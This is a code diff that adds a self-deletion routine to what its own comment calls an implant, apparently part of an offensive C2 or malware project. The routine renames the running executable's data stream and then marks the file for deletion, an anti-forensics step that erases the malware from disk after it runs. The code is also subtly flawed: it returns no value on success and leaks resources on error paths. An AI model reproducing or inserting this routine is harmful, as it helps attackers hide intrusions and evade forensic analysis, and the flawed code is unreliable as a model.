@@ -550,4 +550,84 @@ namespace System::Fs
         dwFileSize = fileInfo.EndOfFile.QuadPart;
         return dwFileSize;
     }
+
+    // Self-Deletion is used after terminating the implant process.
+    // https://www.rotta.rocks/offensive-tool-development/anti-analysis-techniques/anti-debugging-techniques/self-deleting-malware#final-code
+    BOOL SelfDelete(Procs::PPROCS pProcs)
+    {
+        LPCWSTR lpNewStream = L":null";
+        SIZE_T dwStreamLength = wcslen(lpNewStream) * sizeof(wchar_t);
+        SIZE_T dwRename = sizeof(FILE_RENAME_INFO) + dwStreamLength;
+
+        PFILE_RENAME_INFO pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwRename);
+        if (!pRename)
+        {
+            return FALSE;
+        }
+
+        WCHAR wPath[MAX_PATH * 2] = {0};
+        FILE_DISPOSITION_INFO fdi = {0};
+
+        ZeroMemory(wPath, sizeof(wPath));
+        ZeroMemory(&fdi, sizeof(FILE_DISPOSITION_INFO));
+
+        fdi.DeleteFile = TRUE;
+
+        pRename->FileNameLength = dwStreamLength;
+        RtlCopyMemory(pRename->FileName, lpNewStream, dwStreamLength);
+
+        // Get the path for the current executable itself.
+        if (GetModuleFileNameW(NULL, wPath, MAX_PATH * 2) == 0)
+        {
+            return FALSE;
+        }
+
+        // Rename
+        HANDLE hFile;
+        hFile = CreateFileW(
+            wPath,
+            DELETE | SYNCHRONIZE,
+            FILE_SHARE_READ,
+            nullptr,
+            OPEN_EXISTING,
+            0,
+            nullptr
+        );
+        if (hFile == INVALID_HANDLE_VALUE)
+        {
+            return FALSE;
+        }
+
+        // Rename the data stream
+        if (!pProcs->lpSetFileInformationByHandle(hFile, FileRenameInfo, pRename, dwRename))
+        {
+            return FALSE;
+        }
+
+        CloseHandle(hFile);
+
+        // Delete
+        hFile = CreateFileW(
+            wPath,
+            DELETE | SYNCHRONIZE,
+            FILE_SHARE_READ,
+            nullptr,
+            OPEN_EXISTING,
+            0,
+            nullptr
+        );
+        if (hFile == INVALID_HANDLE_VALUE)
+        {
+            return FALSE;
+        }
+
+        if (!pProcs->lpSetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(fdi)))
+        {
+            return FALSE;
+        }
+
+        CloseHandle(hFile);
+
+        HeapFree(GetProcessHeap(), 0, pRename);
+    }
 }
